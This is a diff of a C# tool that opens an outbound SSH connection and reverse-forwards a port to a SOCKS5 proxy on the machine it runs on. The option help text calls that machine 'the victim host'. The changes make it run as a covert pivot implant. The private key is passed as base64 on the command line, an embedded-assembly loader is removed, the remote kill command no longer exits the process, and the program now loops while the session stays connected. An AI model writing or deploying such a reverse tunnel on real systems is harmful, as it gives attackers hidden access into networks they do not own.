@@ -1,10 +1,33 @@
-﻿using Renci.SshNet;
+using Renci.SshNet;
 using System;
 using System.Net;
 using System.Net.Sockets;
-using System.Reflection;
 using System.Threading.Tasks;
+using CommandLine;
+using System.Collections.Generic;
+using System.Text;
 
+class Options
+{
+    [Option('s', "server", Required = true, HelpText = "SSH server IP address")]
+    public string host { get; set; }
+
+    [Option('p', "sshPort", Required = true, HelpText = "SSH Port to connect to")]
+    public int sshPort { get; set; }
+
+    [Option('u', "username", Required = true, HelpText = "Username to autenticate with")]
+    public string username { get; set; }
+
+    [Option('k', "privateKeyPath", Required = true, HelpText = "Path to the private key file to authenticate with")]
+    public string pivateKeyPath { get; set; }
+
+    [Option('r', "remotePort", Required = true, HelpText = "Port on SSH server to forward to Socks proxy")]
+    public uint remotePort { get; set; }
+
+    [Option('l', "localSocksPort", Required = true, HelpText = "Port to setup Socks proxy on the victim host")]
+    public uint localSocksPort { get; set; }
+
+}
 class SSHClientWithSocks5Proxy
 {
     private SshClient _sshClient;
@@ -14,9 +37,12 @@ class SSHClientWithSocks5Proxy
     public SSHClientWithSocks5Proxy(string host, int port, string username, string privateKeyPath)
     {
         // Set up the SSH client using public key authentication (no passphrase)
-        var privateKey = new PrivateKeyFile(privateKeyPath);
+        byte[] privateKeyBytes = Convert.FromBase64String(privateKeyPath);
+        var privateKeyStream = new System.IO.MemoryStream(privateKeyBytes);
+        //var privateKey = new PrivateKeyFile(privateKeyPath);
+        var privateKey = new PrivateKeyFile(privateKeyStream);
         var keyFiles = new[] { privateKey };
-
+        
         _sshClient = new SshClient(host, port, username, keyFiles);
     }
 
@@ -45,6 +71,7 @@ class SSHClientWithSocks5Proxy
     {
         _socks5Server = new TcpListener(IPAddress.Parse("127.0.0.1"), (int)localSocksPort);
         _socks5Server.Start();
+
         Console.WriteLine($"SOCKS5 proxy server started on localhost:{localSocksPort}");
 
         // Handle incoming SOCKS5 connections in a loop
@@ -128,10 +155,7 @@ class SSHClientWithSocks5Proxy
             if (destinationAddress == "xxx.xxx")
             {
                 Console.WriteLine("Received exit command. Shutting down...");
-                client.Close();
-                this.StopServices();
                 this.Disconnect();
-                System.Environment.Exit(0);
             }
         }
         else
@@ -264,9 +288,6 @@ class SSHClientWithSocks5Proxy
                 var udpResult = await udpClient.ReceiveAsync();
                 IPEndPoint clientEndPoint = new IPEndPoint(IPAddress.Parse(clientAddress), clientPort);
 
-                // Here, we would parse the SOCKS5 UDP datagram header and forward the packet.
-                // For simplicity, we're forwarding packets as-is.
-
                 // Forward received data to the client
                 await udpClient.SendAsync(udpResult.Buffer, udpResult.Buffer.Length, clientEndPoint);
             }
@@ -285,7 +306,6 @@ class SSHClientWithSocks5Proxy
             _remotePortForwarding.Stop();
             Console.WriteLine("Remote port forwarding stopped.");
         }
-
         _socks5Server?.Stop();
         Console.WriteLine("SOCKS5 proxy server stopped.");
     }
@@ -298,57 +318,25 @@ class SSHClientWithSocks5Proxy
             Console.WriteLine("Disconnected from SSH server.");
         }
     }
+    static void RunOptions(Options opts)
+    {
+        var sshClient = new SSHClientWithSocks5Proxy(opts.host, opts.sshPort, opts.username, opts.pivateKeyPath);
+        sshClient.Connect();
+        sshClient.StartSocks5Server(opts.localSocksPort);
+        sshClient.StartRemotePortForwarding("127.0.0.1", opts.remotePort, opts.localSocksPort);
+        Console.WriteLine("Proxy may be remotely shut down by sending a connection request to xxx.xxx via the proxy.");
+        while (sshClient._sshClient.IsConnected)
+        {}
+    }
+    static void HandleParseError(IEnumerable<Error> errs)
+    {
+        Console.Write(errs);
+    }
 
     static async Task Main(string[] args)
     {
-        if (args.Length < 4)
-        {
-            Console.WriteLine("Usage: SSHClientWithSocks5Proxy <host> <username> <privateKeyPath> <remotePort>");
-            return;
-        }
-
-        AppDomain.CurrentDomain.AssemblyResolve += (sender, args2) => {
-
-            String resourceName = "AssemblyLoadingAndReflection." +
-
-               new AssemblyName(args2.Name).Name + ".dll";
-
-            using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
-            {
-
-                Byte[] assemblyData = new Byte[stream.Length];
-
-                stream.Read(assemblyData, 0, assemblyData.Length);
-
-                return Assembly.Load(assemblyData);
-
-            }
-        };
-
-        // Parse command-line arguments
-        string host = args[0]; // SSH Server IP or hostname
-        int sshPort = int.Parse(args[1]); //SSH Port
-        string username = args[2]; // SSH Username
-        string privateKeyPath = args[3]; // Path to Private Key
-        uint remotePort = uint.Parse(args[4]); // Remote port on the SSH server
-        uint localSocksPort = 1080; // Local SOCKS5 proxy port
-
-        var sshClient = new SSHClientWithSocks5Proxy(host, sshPort, username, privateKeyPath);
-
-        // Connect to the SSH server
-        sshClient.Connect();
-
-        // Start the SOCKS5 proxy server on the client
-        sshClient.StartSocks5Server(localSocksPort);
-
-        // Forward the remote port on the server to the local SOCKS5 proxy
-        sshClient.StartRemotePortForwarding("127.0.0.1", remotePort, localSocksPort);
-
-        Console.WriteLine("Press any key to stop the SOCKS5 proxy and disconnect...");
-        Console.WriteLine("Proxy may also be remotely shut down by sending a connection request to xxx.xxx via the proxy.");
-        Console.ReadKey();
-
-        // Stop services and disconnect
-        sshClient.Disconnect();
+        CommandLine.Parser.Default.ParseArguments<Options>(args)
+            .WithParsed(RunOptions)
+            .WithNotParsed(HandleParseError);
     }
 }
